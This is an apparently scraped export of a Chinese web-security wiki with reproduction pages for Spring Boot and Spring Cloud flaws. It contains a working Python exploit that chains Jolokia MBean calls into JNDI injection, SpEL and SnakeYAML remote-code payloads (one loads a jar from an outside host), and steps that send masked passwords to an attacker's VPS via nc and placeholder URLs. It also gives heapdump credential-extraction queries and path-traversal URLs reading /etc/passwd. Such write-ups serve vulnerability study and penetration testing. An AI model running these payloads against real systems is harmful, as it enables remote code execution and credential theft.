2021-07-15 20:03:57 "},"Web安全/Spring Boot/Spring Boot Tomcat导致的JNDI注入/Spring Boot Tomcat导致的JNDI注入.html":{"url":"Web安全/Spring Boot/Spring Boot Tomcat导致的JNDI注入/Spring Boot Tomcat导致的JNDI注入.html","title":"Spring Boot Tomcat导致的JNDI注入","keywords":"","body":"Spring Boot Tomcat导致的JNDI注入 一、漏洞简介 二、漏洞影响 Spring Boot 1 - 1.4 三、复现过程 漏洞分析 spring Boot 内嵌了一个 Tomcat，所以在 MBean 列表中列出了 Tomcat 的 MBean。通过漫长的寻找（花了我两三天的晚上），找到了几个比较有意思的且感觉可以利用的 MBean operation。 Tomcat:type=MBeanFactory createJNDIRealm -> JNDI Injection Tomcat:type=MBeanFactory createJDBCRealm -> JNDI Injection Tomcat:type=MBeanFactory createDataSourceRealm -> JNDI Injection Tomcat:type=MBeanFactory createUserDatabaseRealm -> JNDI Injection Tomcat:type=MBeanFactory createValve -> Create Valve (File Writting, JNDI Injection) 这里举一个 createUserDatabaseRealm 的例子： FILE: tomcat-embed-core-8.5.15-sources.jar!\\org\\apache\\catalina\\mbeans\\MBeanFactory.java public String createUserDatabaseRealm(String parent, String resourceName) throws Exception { // Create a new UserDatabaseRealm instance UserDatabaseRealm realm = new UserDatabaseRealm(); realm.setResourceName(resourceName); // Add the new instance to its parent component ObjectName pname = new ObjectName(parent); Container container = getParentContainerFromParent(pname); // Add the new instance to its parent component container.setRealm(realm); // Return the corresponding MBean name ObjectName oname = realm.getObjectName(); // FIXME getObjectName() returns null //ObjectName oname = // MBeanUtils.createObjectName(pname.getDomain(), realm); if (oname != null) { return (oname.toString()); } else { return null; } } 调用 setter 把 resourceName 写入。接着在 start Realm 的时候，会调用以下函数： FILE: tomcat-embed-core\\8.5.15-embed-core-8.5.15-sources.jar!.java @Override protected void startInternal() throws LifecycleException { try { Context context = getServer().getGlobalNamingContext(); database = (UserDatabase) context.lookup(resourceName); } catch (Throwable e) { ExceptionUtils.handleThrowable(e); containerLog.error(sm.getString(\"userDatabaseRealm.lookup\", resourceName), e); database = null; } if (database == null) { throw new LifecycleException (sm.getString(\"userDatabaseRealm.noDatabase\", resourceName)); } super.startInternal(); } 是不是非常熟悉的场景？context.lookup(resourceName)，而 resourceName 可控，那么可以直接JNDI 注入了。但是遗憾的是getServer().getGlobalNamingContext() 返回的是 null，所以在lookup的时候抛了 NullPointer 的错误。还有一些奇奇怪怪的 Bug，比如利用 createValve 创建一个JDBCAccessLogValve，但是利用 Jolokia 设置其 driverName 的时候，由于 driverName 没有getter，导致 Jolokia 不能正常设置；再比如 createJDBCRealm 的时候，由于这个方法接受的参数和MBean 导出（mbeans-descriptors.xml）的配置文件内写的参数数量不一致导致无法调用这个 MBean operation。 createJNDIRealm 在多次尝试后，最终我盯上了 createJNDIRealm 这个方法。 FILE: tomcat-embed-core-8.5.15-sources.jar!.java public String createJNDIRealm(String parent) throws Exception { // Create a new JNDIRealm instance JNDIRealm realm = new JNDIRealm(); // Add the new instance to its parent component ObjectName pname = new ObjectName(parent); Container container = getParentContainerFromParent(pname); // Add the new instance to its parent component container.setRealm(realm); // Return the corresponding MBean name ObjectName oname = realm.getObjectName(); if (oname != null) { return (oname.toString()); } else { return null; } } 这里只传入了 parent。利用 Burpsuite 先创建这个 Realm。 POST /jolokia/ HTTP/1.1 Host: localhost Content-Type: application/json Content-Length: 133 { \"type\": \"EXEC\", \"mbean\": \"Tomcat:type=MBeanFactory\", \"operation\": \"createJNDIRealm\", \"arguments\": [\"Tomcat:type=Engine\"] } 创建成功后，我们查看这个 Realm 的 MBean 信息： realmPath=/realm0,type=Realm: { op: {...}, attr: { userPassword: {}, ... connectionURL: { rw: true, type: \"java.lang.String\", desc: \"The connection URL for the server we will contact\" }, roleNested: {}, userSearch: {}, connectionTimeout: {}, authentication: {}, contextFactory: { rw: true, type: \"java.lang.String\", desc: \"The JNDI context factory for this Realm\" }, userPattern: {}, ... }, class: \"org.apache.tomcat.util.modeler.BaseModelMBean\", desc: \"Implementation of Realm that works with a directory server a...\" } 注意到两个有意思的属性，connectionURL 和 contextFactory。查看 JNDIRealm 的源码： FILE: protected Hashtable getDirectoryContextEnvironment() { Hashtable env = new Hashtable(); if (this.containerLog.isDebugEnabled() && this.connectionAttempt == 0) { this.containerLog.debug(\"Connecting to URL \" + this.connectionURL); } else if (this.containerLog.isDebugEnabled() && this.connectionAttempt > 0) { this.containerLog.debug(\"Connecting to URL \" + this.alternateURL); } env.put(\"java.naming.factory.initial\", this.contextFactory); if (this.connectionName != null) { env.put(\"java.naming.security.principal\", this.connectionName); } if (this.connectionPassword != null) { env.put(\"java.naming.security.credentials\", this.connectionPassword); } if (this.connectionURL != null && this.connectionAttempt == 0) { env.put(\"java.naming.provider.url\", this.connectionURL); } else if (this.alternateURL != null && this.connectionAttempt > 0) { env.put(\"java.naming.provider.url\", this.alternateURL); } ... return env; } private DirContext createDirContext(Hashtable env) throws NamingException { return (DirContext)(this.useStartTls ? this.createTlsDirContext(env) : new InitialDirContext(env)); } 可见 java.naming.factory.initial 和 java.naming.provider.url 我们都可以通过 MBean 来进行修改，接着在 createDirContext 方法，利用刚才的 env 创建了 InitialDirContext 对象。最终可以造成JNDI 注入。于是我满怀欣喜的搭建好 RMI Service，却发现爆了这么一个错误： javax.naming.ConfigurationException: The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'. at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:495) ~[na:1.8.0_121] at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138) ~[na:1.8.0_121] at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205) ~[na:1.8.0_121] at com.sun.jndi.url.rmi.rmiURLContextFactory.getUsingURL(rmiURLContextFactory.java:71) ~[na:1.8.0_121] at com.sun.jndi.url.rmi.rmiURLContextFactory.getObjectInstance(rmiURLContextFactory.java:56) ~[na:1.8.0_121] at com.sun.jndi.rmi.registry.RegistryContextFactory.URLToContext(RegistryContextFactory.java:102) ~[na:1.8.0_121] at com.sun.jndi.rmi.registry.RegistryContextFactory.getInitialContext(RegistryContextFactory.java:69) ~[na:1.8.0_121] ... 漏洞复现 由于 Spring Boot 内嵌了 Tomcat 和 Tomcat EL，可以直接使用文章中的 Exploit。最终 Exploit 触发分为五个步骤。 a. 创建 JNDIRealm b. 写入 connectionURL 为你的 RMI Service URL c. 写入 contextFactory 为 RegistryContextFactory d. 停止 Realm e. 启动 Realm 以触发 JNDI 注入 最终 Exploit 如下： import requests, sys, time, pprint url = sys.argv[1] create_realm = { \"mbean\": \"Tomcat:type=MBeanFactory\", \"type\": \"EXEC\", \"operation\": \"createJNDIRealm\", \"arguments\": [\"Tomcat:type=Engine\"] } wirte_factory = { \"mbean\": \"Tomcat:realmPath=/realm0,type=Realm\", \"type\": \"WRITE\", \"attribute\": \"contextFactory\", \"value\": \"com.sun.jndi.rmi.registry.RegistryContextFactory\" } write_url = { \"mbean\": \"Tomcat:realmPath=/realm0,type=Realm\", \"type\": \"WRITE\", \"attribute\": \"connectionURL\", \"value\": \"rmi://localhost:1097/Object\" } stop = { \"mbean\": \"Tomcat:realmPath=/realm0,type=Realm\", \"type\": \"EXEC\", \"operation\": \"stop\", \"arguments\": [] } start = { \"mbean\": \"Tomcat:realmPath=/realm0,type=Realm\", \"type\": \"EXEC\", \"operation\": \"start\", \"arguments\": [] } flow = [create_realm, wirte_factory, write_url, stop, start] for i in flow: print('%s MBean %s: %s ...' % (i['type'].title(), i['mbean'], i.get('operation', i.get('attribute')))) requests.post(url, json=i).json() 补充 利用UNC部署war文件（只能用于windows） 在 Tomcat Host Manager 这里可以利用 UNC 来部署 war 文件。实际上对于Tomcat:type=MBeanFactory 的createStandardHost，和 Host Manager 这里调用的是相同的方法。所以根据文章所述的方法，我们同样可以在Jolokia 里重现。不过可惜的是这里只对 Windows 有效。 首先去 spring-boot 的 Github 下载 spring-boot-samples-traditional，在 web.xml 里添加如下内容： default org.apache.catalina.servlets.DefaultServlet debug 0 listings false 1 default /default 然后修改 WebConfig.java，在 dispatcherServlet 添加执行命令的代码： @Bean // Only used when running in embedded servlet public DispatcherServlet dispatcherServlet() throws Exception { Runtime.getRuntime().exec(\"calc\"); return new DispatcherServlet(); } 接着打包成 war 文件放在远程的共享服务器上面，发送如下请求即可： POST /jolokia HTTP/1.1 Host: localhost Content-Type: application/json Content-Length: 192 { \"mbean\": \"Tomcat:type=MBeanFactory\", \"type\": \"EXEC\", \"operation\": \"createStandardHost\", \"arguments\": [\"Tomcat:type=Engine\", \"test2\", \"\\\\127.0.0.1\\test\", true, true, true, true] } Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:03:58 "},"Web安全/Spring Boot/Spring Boot whitelabel error page SpEL rce/Spring Boot whitelabel error page SpEL rce.html":{"url":"Web安全/Spring Boot/Spring Boot whitelabel error page SpEL rce/Spring Boot whitelabel error page SpEL rce.html","title":"Spring Boot Whitelabel Error Page Sp EL Rce","keywords":"","body":"Spring Boot whitelabel error page SpEL rce 一、漏洞简介 利用条件 至少知道一个触发 springboot 默认错误页面的接口及参数名 二、漏洞影响 spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0 三、复现过程 漏洞原理： spring boot 处理参数值出错，流程进入 org.springframework.util.PropertyPlaceholderHelper 类中 此时 URL 中的参数值会用 parseStringValue 方法进行递归解析 其中 ${} 包围的内容都会被 org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration 类的 resolvePlaceholder 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞 漏洞复现 步骤一：找到一个正常传参处 比如发现访问 /article?id=xxx ，页面会报状态码为 500 的错误： Whitelabel Error Page，则后续 payload 都将会在参数 id 处尝试。 步骤二：执行 SpEL 表达式 输入 /article?id=${7*7} ，如果发现报错页面将 7*7 的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。 由字符串格式转换成 0x** java 字节形式，方便执行任意代码： # coding: utf-8 result = \"\" target = 'open -a Calculator' for x in target: result += hex(ord(x)) + \",\" print(result.rstrip(',')) 执行 open -a Calculator 命令 ${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))} 正常访问： http://www.0-sec.org:9091/article?id=66 执行 open -a Calculator 命令： http://www.0-sec.org:9091/article?id=${T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))} Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:03:59 "},"Web安全/Spring Boot/Spring Boot 修改环境属性导致的rce/Spring Boot 修改环境属性导致的rce.html":{"url":"Web安全/Spring Boot/Spring Boot 修改环境属性导致的rce/Spring Boot 修改环境属性导致的rce.html","title":"Spring Boot 修改环境属性导致的rce","keywords":"","body":"Spring Boot 修改环境属性导致的rce 一、漏洞简介 二、漏洞影响 Spring Boot 2.x 三、复现过程 环境下载 https://github.com/ianxtianxt/actuator-testbed POST /env HTTP/1.1 Host: 127.0.0.1:8090 Content-Type: application/x-www-form-urlencoded Content-Length: 59 spring.cloud.bootstrap.location=http://artsploit.com/yaml-payload.yml 该请求修改了\" spring.cloud.bootstrap.location\"属性，该属性用于加载外部配置并以YAML格式解析它。为了做到这一点，我们还需要调用\" refresh\"端点。 POST /refresh HTTP/1.1 Host: 127.0.0.1:8090 Content-Type: application/x-www-form-urlencoded Content-Length: 0 从远程服务器获取YAML配置时，将使用SnakeYAML库进行解析，该库也容易受到反序列化攻击。有效载荷（yaml-payload.yml）可以通过使用前述的Marshalsec研究生成： !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [\"http://artsploit.com/yaml-payload.jar\"] ]] ] 该文件的反序列化将触发提供的URLClassLoader的ScriptEngineManager构造函数的执行。简而言之，它导致了**\\'java.util.ServiceLoader＃load（java.lang.Class ，java.lang.ClassLoader）\\'**方法，该方法试图在所有库中查找\\'ScriptEngineFactory\\'接口的所有实现。在类路径中。由于我们可以通过URLClassLoader添加新的库，因此我们可以在其中包含恶意字节码的情况下为新的\\'ScriptEngineFactory\\'提供服务。为此，我们需要使用以下必需文件创建一个jar归档文件：https://github.com/ianxtianxt/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java应该包含实际的字节码，并在构造函数中带有恶意负载。 public class AwesomeScriptEngineFactory implements ScriptEngineFactory { public AwesomeScriptEngineFactory() { try { Runtime.getRuntime().exec(\"dig scriptengine.x.artsploit.com\"); Runtime.getRuntime().exec(\"/Applications/Calculator.app/Contents/MacOS/Calculator\"); } catch (IOException e) { e.printStackTrace(); } https://github.com/ianxtianxt/yaml-payload/blob/master/src/META-INF/services/javax.script.ScriptEngineFactory应该只是一个包含对\\'artsploit.AwesomeScriptEngineFactory\\'的完整引用的文本文件，以便ServiceLoader知道在哪里可以找到该类：**artsploit.AwesomeScriptEngineFactory**同样，这种利用技术要求弹簧云位于类路径中，但是与Eureka的XStream有效负载相比，它甚至可以在最新版本中使用 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:03:59 "},"Web安全/Spring Boot/Spring Boot 提取内存密码/Spring Boot 提取内存密码.html":{"url":"Web安全/Spring Boot/Spring Boot 提取内存密码/Spring Boot 提取内存密码.html","title":"Spring Boot 提取内存密码","keywords":"","body":"Spring Boot 提取内存密码 一、漏洞简介 二、漏洞影响 三、复现过程 访问如下路径如果有数据说明存在漏洞 Spring Boot 1.x版本http://www.0-sec.org:8090/env Spring Boot 2.x版本http://www.0-sec.org:8090/actuator/env 当发现存在未授权漏洞时，可以直接访问 /actuator/heapdump 下载内存，提取密码 http://www.0-sec.org:8090/actuator/heapdump heapdump文件下载完成之后可以利用Eclipse Memory Analyzer 来解析内存文件 http://www.eclipse.org/mat/downloads.php 匹配内存中password字符串，并不一定能匹配完，可以通过/actuator/env得到的JDBC信息再来匹配关键字 select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(\"password\")) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:04:04 "},"Web安全/Spring Boot/Spring Boot 获取被星号脱敏的密码的明文/Spring Boot 获取被星号脱敏的密码的明文.html":{"url":"Web安全/Spring Boot/Spring Boot 获取被星号脱敏的密码的明文/Spring Boot 获取被星号脱敏的密码的明文.html","title":"Spring Boot 获取被星号脱敏的密码的明文","keywords":"","body":"获取被星号脱敏的密码的明文 (方法一) 访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果 利用条件： 目标网站存在 /jolokia 或 /actuator/jolokia 接口 目标使用了 jolokia-core 依赖（版本要求暂未知） 利用方法： 步骤一： 找到想要获取的属性名 GET 请求目标网站的 /env 或 /actuator/env 接口，搜索 ****** 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。 步骤二： jolokia 调用相关 Mbean 获取明文 将下面示例中的 security.user.password 替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 value 键中。 调用 org.springframework.boot Mbean（可能更通用） 实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法 spring 1.x POST /jolokia Content-Type: application/json {\"mbean\": \"org.springframework.boot:name=SpringApplication,type=Admin\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"security.user.password\"]} spring 2.x POST /actuator/jolokia Content-Type: application/json {\"mbean\": \"org.springframework.boot:name=SpringApplication,type=Admin\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"security.user.password\"]} 调用 org.springframework.cloud.context.environment Mbean（需要 spring cloud 相关依赖） 实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法 spring 1.x POST /jolokia Content-Type: application/json {\"mbean\": \"org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"security.user.password\"]} spring 2.x POST /actuator/jolokia Content-Type: application/json {\"mbean\": \"org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"security.user.password\"]} 获取被星号脱敏的密码的明文 (方法二) 访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果 利用条件： 可以 GET 请求目标网站的 /env 可以 POST 请求目标网站的 /env 可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖） 目标使用了 spring-cloud-starter-netflix-eureka-client 依赖 目标可以请求攻击者的服务器（请求可出外网） 利用方法： 步骤一： 找到想要获取的属性名 GET 请求目标网站的 /env 或 /actuator/env 接口，搜索 ****** 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。 步骤二： 使用 nc 监听 HTTP 请求 在自己控制的外网服务器上监听 80 端口： nc -lvk 80 步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性 将下面 http://value:${security.user.password}@your-vps-ip 中的 security.user.password 换成自己想要获取的对应的星号 * 遮掩的属性名； your-vps-ip 换成自己外网服务器的真实 ip 地址。 spring 1.x POST /env Content-Type: application/x-www-form-urlencoded eureka.client.serviceUrl.defaultZone=http://value:${security.user.password}@your-vps-ip spring 2.x POST /actuator/env Content-Type: application/json {\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://value:${security.user.password}@your-vps-ip\"} 步骤四： 刷新配置 spring 1.x POST /refresh Content-Type: application/x-www-form-urlencoded spring 2.x POST /actuator/refresh Content-Type: application/json 步骤五： 解码属性值 正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 Authorization 头内容： Authorization: Basic dmFsdWU6MTIzNDU2 将其中的 dmFsdWU6MTIzNDU2部分使用 base64 解码，即可获得类似明文值 value:123456，其中的 123456 即是目标星号 * 脱敏前的属性值明文。 获取被星号脱敏的密码的明文 (方法三) 访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果 利用条件： 通过 POST /env 设置属性触发目标对外网指定地址发起任意 http 请求 目标可以请求攻击者的服务器（请求可出外网） 利用方法： 参考 UUUUnotfound 提出的 issue-1，可以在目标发外部 http 请求的过程中，在 url path 中利用占位符带出数据 步骤一： 找到想要获取的属性名 GET 请求目标网站的 /env 或 /actuator/env 接口，搜索 ****** 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。 步骤二： 使用 nc 监听 HTTP 请求 在自己控制的外网服务器上监听 80 端口： nc -lvk 80 步骤三： 触发对外 http 请求 spring.cloud.bootstrap.location 方法（同时适用于明文数据中有特殊 url 字符的情况）： spring 1.x POST /env Content-Type: application/x-www-form-urlencoded spring.cloud.bootstrap.location=http://your-vps-ip/?=${security.user.password} spring 2.x POST /actuator/env Content-Type: application/json {\"name\":\"spring.cloud.bootstrap.location\",\"value\":\"http://your-vps-ip/?=${security.user.password}\"} eureka.client.serviceUrl.defaultZone 方法（不适用于明文数据中有特殊 url 字符的情况）： spring 1.x POST /env Content-Type: application/x-www-form-urlencoded eureka.client.serviceUrl.defaultZone=http://your-vps-ip/${security.user.password} spring 2.x POST /actuator/env Content-Type: application/json {\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://your-vps-ip/${security.user.password}\"} 步骤四： 刷新配置 spring 1.x POST /refresh Content-Type: application/x-www-form-urlencoded spring 2.x POST /actuator/refresh Content-Type: application/json Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:04:05 "},"Web安全/Spring Boot/Spring Boot 路由地址及接口调用详情泄漏/Spring Boot 路由地址及接口调用详情泄漏.html":{"url":"Web安全/Spring Boot/Spring Boot 路由地址及接口调用详情泄漏/Spring Boot 路由地址及接口调用详情泄漏.html","title":"Spring Boot 路由地址及接口调用详情泄漏","keywords":"","body":"Spring Boot 路由地址及接口调用详情泄漏 一、漏洞简介 开发环境切换为线上生产环境时，相关人员没有更改配置文件或忘记切换配置环境，导致此漏洞 二、漏洞影响 三、复现过程 直接访问以下几个路由，验证漏洞是否存在： /api-docs /v2/api-docs /swagger-ui.html 一些可能会遇到的接口路由变形： /api.html /sw/swagger-ui.html /api/swagger-ui.html /template/swagger-ui.html /spring-security-rest/api/swagger-ui.html /spring-security-oauth-resource/swagger-ui.html 除此之外，下面的路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息： /mappings /actuator/mappings /metrics /actuator/metrics /beans /actuator/beans /configprops /actuator/configprops 一般来讲，知道 spring boot 应用的相关接口和传参信息并不能算是漏洞； 但是可以检查暴露的接口是否存在未授权访问、越权或者其他业务型漏洞。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:04:06 "},"Web安全/Spring Boot/Spring Boot 配置不当而暴露的路由/Spring Boot 配置不当而暴露的路由.html":{"url":"Web安全/Spring Boot/Spring Boot 配置不当而暴露的路由/Spring Boot 配置不当而暴露的路由.html","title":"Spring Boot 配置不当而暴露的路由","keywords":"","body":"Spring Boot 配置不当而暴露的路由 一、漏洞简介 主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置 二、漏洞影响 三、复现过程 路由知识 Spring Boot 1.x 版本默认内置路由的根路径以 / 开始，2.x 则统一以 /actuator 开始 有些程序员会自定义 /manage、/management 或 项目相关名称 为根路径 默认内置路由名字，如 /env 有时候也会被程序员修改，如修改成 /appenv trace health loggers metrics autoconfig heapdump threaddump env info dump configprops mappings auditevents beans jolokia cloudfoundryapplication hystrix.stream actuator actuator/auditevents actuator/beans actuator/health actuator/conditions actuator/configprops actuator/env actuator/info actuator/loggers actuator/heapdump actuator/threaddump actuator/metrics actuator/scheduledtasks actuator/httptrace actuator/mappings actuator/jolokia actuator/hystrix.stream 其中对寻找漏洞比较重要接口的有： /env、/actuator/env GET 请求 /env 会泄露环境变量信息，或者配置中的一些用户名，当程序员的属性名命名不规范 (例如 password 写成 psasword、pwd) 时，会泄露密码明文； 同时有一定概率可以通过 POST 请求 /env 接口设置一些属性，触发相关 RCE 漏洞。 /jolokia 通过 /jolokia/list 接口寻找可以利用的 MBean，触发相关 RCE 漏洞； /trace 一些 http 请求包访问跟踪信息，有可能发现有效的 cookie 信息 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:04:07 "},"Web安全/Spring Cloud/（CVE-2019-3799）Spring Cloud Config Server 任意文件读取/（CVE-2019-3799）Spring Cloud Config Server 任意文件读取 .html":{"url":"Web安全/Spring Cloud/（CVE-2019-3799）Spring Cloud Config Server 任意文件读取/（CVE-2019-3799）Spring Cloud Config Server 任意文件读取 .html","title":"（CVE-2019-3799）Spring Cloud Config Server 任意文件读取 ","keywords":"","body":"（CVE-2019-3799）Spring Cloud Config Server 任意文件读取 一、漏洞简介 二、漏洞影响 Spring Cloud Config 2.1.0 to 2.1.1 Spring Cloud Config 2.0.0 to 2.0.3 Spring Cloud Config 1.4.0 to 1.4.5 其他不受支持的老版本 （如Spring Cloud Config1.3及其以下版本） 三、复现过程 http://www.0-sec.org/test/pathtraversal/master/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f../etc/passwd Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:04:08 "},"Web安全/Spring Cloud/（CVE-2020-5405）Spring Cloud Config Server 目录穿越漏洞/（CVE-2020-5405）Spring Cloud Config Server 目录穿越漏洞.html":{"url":"Web安全/Spring Cloud/（CVE-2020-5405）Spring Cloud Config Server 目录穿越漏洞/（CVE-2020-5405）Spring Cloud Config Server 目录穿越漏洞.html","title":"（CVE-2020-5405）Spring Cloud Config Server 目录穿越漏洞","keywords":"","body":"（CVE-2020-5405）Spring Cloud Config Server 目录穿越漏洞 一、漏洞简介 Spring Cloud Config为分布式系统的外部配置提供客户端的服务端的支持。使用了它，开发人员就可以在一个中心仓库管理应用程序在所有环境中的外部配置。2020-02-26 Spring 收到漏洞报告, Spring Cloud Config Server 存在目录穿越漏洞。 二、漏洞影响 Spring Cloud Config Server 2.2.0-2.2.1 Spring Cloud Config Server 2.1.0-2.1.6 三、复现过程 漏洞分析 其实往前看有个替换的操作,很显眼 SpringCloudConfigServer目录穿越漏洞/media/rId25.png) name和label的(_)会被替换成/,看到这里,我尝试构造poc http://www.0-sec.org:8888/aaaa/aaaa/%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%65%74%63/passwd 我们让label为..(_)..(_)..(_)..(_)..(_)..(_)..(_)..(_)etc,path为passwd,这样拼接完应该是file:/xxx/xxx/xxx/../../../../../etc/passwd 但是如果label不为master的话,代码逻辑就会先去checkout,然后就异常了 这里面会导致抛出异常,具体抛出异常的点在哪呢,在org.springframework.cloud.config.server.environment.MultipleJGitEnvironmentRepository SpringCloudConfigServer目录穿越漏洞/media/rId26.png) 在CVE-2019-3799中,我们使用的配置是常用的spring.cloud.config.server.git.uri,它会选择使用MultipleJGitEnvironmentRepository.class的getLocations,然后就会走到checkout,抛出异常了,那么我们怎么去不走checkout逻辑呢。 通过翻文档https://zq99299.github.io/note-book/spring-cloud-tutorial/config/002.html#%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E5%90%8E%E7%AB%AF%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F 得知这个配置是让它从本地进行加载,而不是用git,通过在application.properties配置 spring.profiles.active=native spring.cloud.config.server.native.search-locations=file:/Users/p0desta/Desktop 其实通过补丁我们也可以发现端倪 SpringCloudConfigServer目录穿越漏洞/media/rId28.png) 配置后重新跟进调试 SpringCloudConfigServer目录穿越漏洞/media/rId29.png) 然后就在/org/springframework/cloud/config/server/environment/NativeEnvironmentRepository.class@getLocations中对路径进行了处理,大致就是对路径进行拼接,然后存在ouput数组中,返回一个新的Locations对象 SpringCloudConfigServer目录穿越漏洞/media/rId30.png) 然后后面就是跟CVE-2019-3799一样,直接读文件了。 漏洞复现 下载官方Spring Cloud Config，具体版本versions 2.1.5.RELEASE，下载地址为： https://github.com/spring-cloud/spring-cloud-config/archive/v2.1.5.RELEASE.zip 导入IDEA项目 SpringCloudConfigServer目录穿越漏洞/media/rId32.png) 修改配置文件src/main/resources/configserver.yml info: component: Config Server spring: application: name: configserver autoconfigure.exclude: org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration jmx: default_domain: cloud.config.server profiles: active: native cloud: config: server: native: search-locations: - file:///Users/rai4over/Desktop/spring-cloud-config-2.1.5/config-repo server: port: 8888 management: context_path: /admin 设置profiles-active为native，设置search-locations为任意文件夹。 主文件入口位置为org.springframework.cloud.config.server.ConfigServerApplication，运行spring-cloud-config-server模块，环境开启成功运行在127.0.0.1:8888。 POC https://www.0-sec.org:8888/1/1/..(_)..(_)..(_)..(_)..(_)..(_)..(_)..(_)..(_)etc/passwd URL编码变形 https://www.0-sec.org:8888/1/1/..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29etc/passwd 返回结果 SpringCloudConfigServer目录穿越漏洞/media/rId34.png) 参考链接 http://p0desta.com/2020/04/16/spring-cloud-config%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/\\#CVE-2020-5405%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90 https://xz.aliyun.com/t/8303 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:04:16 "},"Web安全/Spring Cloud/（CVE-2020-5410）Spring Cloud Config 目录穿越漏洞/（CVE-2020-5410）Spring Cloud Config 目录穿越漏洞.html":{"url":"Web安全/Spring Cloud/（CVE-2020-5410）Spring Cloud Config 目录穿越漏洞/（CVE-2020-5410）Spring Cloud Config 目录穿越漏洞.html","title":"（CVE-2020-5410）Spring Cloud Config 目录穿越漏洞","keywords":"","body":"（CVE-2020-5410）Spring Cloud Config 目录穿越漏洞 一、漏洞简介 Spring Cloud Config，2.2.3之前的2.2.x版本，2.1.9之前的2.1.x版本以及较旧的不受支持的版本允许应用程序通过spring-cloud-config-server模块提供任意配置文件。恶意用户或攻击者可以使用特制URL发送请求，这可能导致目录遍历攻击。 二、漏洞影响 Spring Cloud Config，2.2.3之前的2.2.x版本，2.1.9之前的2.1.x版本 三、复现过程 漏洞分析 这次补丁主要是两个部分,第一个部分是将对路径的检测方法单独的封装了出来,封装到了PathUtils类中,并且做了部分的修改,其中最主要的是检测了#,至于是为什么,后面来说。SpringCloudConfig目录穿越漏洞/media/rId25.png) 第二部分,也就是漏洞的触发入口，在environment/EnvironmentController.java中,增加了对name、label字段的检测SpringCloudConfig目录穿越漏洞/media/rId26.png)通过补丁我们可以大概知道漏洞应该是出在EnvironmentController,但是具体怎么触发并不知道,所以我们需要跟一遍正常逻辑看一下处理流程。既然是目录穿越漏洞,我们先通过环境变量设置本地读取 profiles: active: native cloud: config: server: native: search-locations: - file:/test/config-repo-master 然后使用正确的请求来动态跟踪调用堆栈http://www.0-sec.org:8889/111/222/333,将断点打在入口处,然后往下跟SpringCloudConfig目录穿越漏洞/media/rId27.png) 